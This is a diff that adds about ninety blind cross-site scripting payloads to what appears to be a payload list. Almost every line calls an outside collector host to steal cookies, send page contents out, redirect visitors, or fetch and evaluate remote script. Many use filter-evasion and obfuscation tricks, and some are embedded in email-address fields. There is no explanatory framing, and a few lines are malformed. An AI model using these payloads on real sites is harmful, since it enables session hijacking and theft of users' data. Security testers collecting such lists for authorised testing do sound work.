@@ -115,3 +115,94 @@ ibro1337@gmail.com<!--" --><script src=https://js.rip/lostsec></script>
 %3C%2Fscript%3E%3CIframe%20SrcDoc%3D%22%3E%3Cscript%20src%3Dhttps%3A%2F%2Fxss0r.com%2Fc%2Fbrocode%3E%3C%2Fscript%3E%22%3E
 --></tiTle></stYle></texTarea></scrIpt>"//'//><scrIpt src="https://js.rip/lostsec"></scrIpt>
 '"><script src=https://js.rip/lostsec></script><img src=x onerror=fetch('https://js.rip/lostsec?c='+document.cookie)>
+'"<img src="https://xss.report/c/lostsec?10" onerror='this.src="https://xss.report/c/lostsec?10"'>
+'"<img src=x onerror='this.src="https://xss.report/c/lostsec?11"'>
+'"<img src=x onerror='fetch("https://xss.report/c/lostsec?12",{method:"POST",body:btoa(document.body.innerHTML),mode:"no-cors"})'>
+'"<iframe src='javascript:window.location="https://xss.report/c/lostsec?13"'></iframe>
+'"<iframe srcdoc='<script>window.location="https://xss.report/c/lostsec?14"</script>'></iframe>
+'"<iframe srcdoc='<script>fetch("https://xss.report/c/lostsec?15",{method:"POST",body:btoa(parent.document.body.innerHTML),mode:"no-cors"})</script>'></iframe>
+'"<object data='javascript:window.location="https://xss.report/c/lostsec?16"'></object>
+<input onfocus='fetch("https://xss.report/c/lostsec?17",{method:"POST",mode:"no-cors"})' autofocus>
+'"<script type="text/javascript" src="https://xss.report/c/lostsec?18"></script>
+'"<script type="module" src="https://xss.report/c/lostsec?19"></script>
+'"<script nomodule src="https://xss.report/c/lostsec?20"></script>
+javascript:window.location="https://xss.report/c/lostsec?21"
+javascript:fetch("https://xss.report/c/lostsec?22")
+--></tiTle></stYle></texTarea></scrIpt>"//'//><scrIpt src="https://xss.report/c/lostsec?23"></scrIpt>
+'"<img src="https://xss.report/c/lostsec?24" onerror="this.src='https://xss.report/c/lostsec?24'">
+'"<svg/onload="window.location.href='https://xss.report/c/lostsec?25'">
+'"<audio src onerror='fetch("https://xss.report/c/lostsec?26",{method:"POST",mode:"no-cors"})'>
+'"<script>new Image().src="https://xss.report/c/lostsec?27"</script>
+'"<form action="https://xss.report/c/lostsec?28" method="POST"><input name="data" value=""></form><script>document.forms[0].submit();</script>
+'"<iframe src="javascript:fetch('https://xss.report/c/lostsec?29')"></iframe>
+'"<link rel="stylesheet" href="https://xss.report/c/lostsec?30" onerror='fetch("https://xss.report/c/lostsec?30")'>
+'"<meta http-equiv="refresh" content="0;url=https://xss.report/c/lostsec?31">
+'"<object data="https://xss.report/c/lostsec?31" onerror='this.data="https://xss.report/c/lostsec?31"'></object>
+javascript:fetch("https://xss.report/c/lostsec?32")
+'"<svg/onload="fetch('https://xss.report/c/lostsec?33'">
+{constructor.constructor('fetch("https://xss.report/c/lostsec?34"')()}
+'"<img src=x onerror="fetch('https://xss.report/c/lostsec?35')">
+'"></script></title></textarea><script src=//https://xss.report/c/lostsec?36></script>
+'"<svg/onload='var a="fetch";var b="https://xss.report/c/lostsec?37"; setTimeout(a+"(b)",1000)'>
+'"<iframe src="javascript:setTimeout('fetch(\"https://xss.report/c/lostsec?38\")', 1000)"></iframe>
+'"<form id='xss'><button form='xss' formaction='javascript:fetch("https://xss.report/c/lostsec?39")'>Click Me</button></form>
+'/*'/*`/*--></noscript></title></textarea></style></template></noembed></script>"//'//><scrIpt src="https://xss.report/c/lostsec?40"></scrIpt>
+'"><img src=x onerror=setTimeout(String.fromCharCode(102,101,116,99,104)+'("https://xss.report/c/lostsec?41")', 0)>
+'"><script>'/*'/*`/*--><svg onload=fetch("https://xss.report/c/lostsec?42")></script>
+'"?><svg/onload="fetch('https://xss.report/c/lostsec?43cookie='+document.cookie)"//>
+<img src=x onerror="setTimeout(function(){fetch('https://xss.report/c/lostsec?44data='+document.cookie)},10)"//>
+<input autofocus onfocus="fetch('https://xss.report/c/lostsec?45token='+document.cookie)"//>
+<iframe src="javascript:void(0)" onload="fetch('https://xss.report/c/lostsec?46url='+location.href)"//><!--" -->
+</noscript><script src=https://xss.report/c/lostsec?47></script>
+--></tiTle></stYle></texTarea></scrIpt>"//'//><scrIpt src=https://xss.report/c/lostsec?48></scrIpt>
+/*'/*`/*--></noscript></title></textarea></style></template></noembed></script>"//'//><scrIpt src="https://xss.report/c/lostsec?49"></scrIpt>
+-'"><Svg Src=//xss.report/c/lostsec?50 OnLoad=import(this.getAttribute('src')+0)>
+email]=zer0_sec+1"><script src="https://xss.report/c/lostsec?51"></script>@h6nt3r@gmail.com
+<input onmouseover="fetch('https://xss.report/c/lostsec?52cookie='+document.cookie)">
+'"><Svg Src=//xss.report/c/lostsec?53 OnLoad=import(this.getAttribute('src')+0)>
+'"><Img Src=//xss.report/c/lostsec?54 Onload=import(src+0)>
+'/*\'/*"/*\"/*</Script><Input/AutoFocus/OnFocus=/**/(import(/https:https://xss.report/c/lostsec?55\00?1=1290/.source))//>
+\"><input autofocus nope="%26quot;x%26quot;" onfocus="frames.location='https://xss.report/c/lostsec?56c='+Reflect.get(document,'coo'+'kie')">
+\"></script><img src="x" onerror="with(document)body.appendChild(createElement('script')).src='https://xss.report/c/lostsec?57'">
+<p><img src="https://xss.report/c/lostsec?58" border="0" />--&gt;</p>
+'"></title></textarea></script></style></noscript><script src=https://xss.report/c/lostsec?59></script>
+‘;"/></textarea></script><script src=//xss.report/c/lostsec?60>
+zer0_sec 1"><script src="https://xss.report/c/lostsec?61"></script>@h6nt3r@gmail.com
+h6nt3r@gmail.com"><script src="https://xss.report/c/lostsec?62"></script>
+h6nt3r@gmail.com"><script src="https://xss.report/c/lostsec?63"></script>
+{globalThis.constructor("fetch('https://xss.report/c/lostsec?64cookie='+document.cookie)")()}
+h6nt3r@gmail.com<!--" --><script src=https://xss.report/c/lostsec?65></script>
+h6nt3r@gmail.com"><script src="https://xss.report/c/lostsec?"66></script>
+h6nt3r@gmail.com"><svg onload="fetch('https://xss.report/c/lostsec?67cookie='+document.cookie)"></svg>
+<iframe src="https://xss.report" onload="fetch('https://xss.report/c/lostsec?68cookie=' + document.cookie)"></iframe>
+</script><Iframe SrcDoc="><script src=https://xss.report/c/lostsec?69></script>">
+</script><Iframe SrcDoc=""><script src=https://xss.report/c/lostsec?70></script>">
+//'"><script src=https://xss.report/c/lostsec?71></script>
+'"><script src=https://xss.report/c/lostsec?72></script>
+<img src=x onerror=fetch('https://xss.report/c/lostsec?73c='+document.cookie)>
+javascript://"><script src=https://xss.report/c/lostsec?74></script>
+javascript://'"><svg onmouseover="fetch('https://xss.report/c/lostsec?75data='+document.cookie)"></svg>
+javascript:/*'/*`/*\" /*</title></style></textarea></noscript></noembed></template></script/-->&lt;svg/onload=/*<html/*/onmouseover=fetch('https://xss.report/c/lostsec?76cookie='+document.cookie)//>
+javascript://</script></textarea></style></noscript></noembed></script></template>&lt;svg/onload=/*fetch('https://xss.report/c/lostsec?77cookie='+document.cookie)/*--><html */ onmouseover=alert()//>
+'//><scrIpt src=//xss.report/c/lostsec?78></scrIpt>
+<a href="javascript:fetch('https://xss.report/c/lostsec?79').then(r=>r.text()).then(t=>{let s=document.createElement('script');s.innerHTML=t;document.body.appendChild(s);})">Click me</a>
+<a href="#" onclick="fetch('https://xss.report/c/lostsec?80').then(r=>r.text()).then(eval)">Click me</a>
+<input onblur="fetch('https://xss.report/c/lostsec?81').then(r=>r.text()).then(eval)">
+<div ondblclick="fetch('https://xss.report/c/lostsec?82').then(r=>r.text()).then(eval)">Double-click me</div>
+<div oncontextmenu="fetch('https://xss.report/c/lostsec?83').then(r=>r.text()).then(eval)">Right-click me</div>
+<div onmouseover="fetch('https://xss.report/c/lostsec?84').then(r=>r.text()).then(eval)">Hover over me</div>
+<div onmousedown="fetch('https://xss.report/c/lostsec?85').then(r=>r.text()).then(eval)">Press me</div>
+<div onmouseup="fetch('https://xss.report/c/lostsec?86').then(r=>r.text()).then(eval)">Release me</div>
+<div onwheel="fetch('https://xss.report/c/lostsec?87').then(r=>r.text()).then(eval)">Scroll on me</div>
+<a onclick="fetch('https://xss.report/c/lostsec?88').then(r=>r.text()).then(eval)">Click</a>
+<a href="javascript:(new Function('fetch(\'https://xss.report/c/lostsec?89\').then(r=>r.text()).then(t=>{let s=document.createElement(\'script\');s.innerHTML=t;document.body.appendChild(s);})'))()">Click me</a>
+<a href="javascript:let f='fetch',u='https://xss.report/c/lostsec?90',e='eval';window[e](`${f}('${u}').then(r=>r.text()).then(t=>{let s=document.createElement('script');s.innerHTML=t;document.body.appendChild(s);})`)">Click me</a>
+<a href="javascript:fetch('https://xss.report/c/lostsec?91').then(r=>r.text()).then(t=>{let s=document.createElement('script');s.innerHTML=t;document.body.appendChild(s);})">Click me</a>
+<a href="javascript:eval('\u0066\u0065\u0074\u0063\u0068(\u0027https://xss.report/c/lostsec?92\u0027).then(\u0072=>\u0072.text()).then(\u0074=>{let \u0073=document.createElement(\u0027script\u0027);\u0073.innerHTML=\u0074;document.body.appendChild(\u0073);})')">Click me</a>
+<div onmouseover="fetch('https://xss.report/c/lostsec?93').then(r=>r.text()).then(eval)">Hover over me</div>
+<a href="javascript:(function(){let s=document.createElement('script');s.src='https://xss.report/c/lostsec?94';document.body.appendChild(s);})()">Click me</a>
+<div onclick="let s=document.createElement('script');s.src='https://xss.report/c/lostsec?95';document.body.appendChild(s);">Click me</div>
+<textarea onfocus="fetch('https://xss.report/c/lostsec?96').then(r=>r.text()).then(eval)">Focus me</textarea>
+<div onclick="let u='https://xss.report/c/'.concat('lostsec?97');fetch(u).then(r=>r.text()).then(eval)">Click me</div>
+"><iframesrcdoc="<script>v#116;tps://https://xss.report/c/lostsec?98";ument.>">
+<="" script=""><script src="//xss.report/c/lostsec?100"></script>
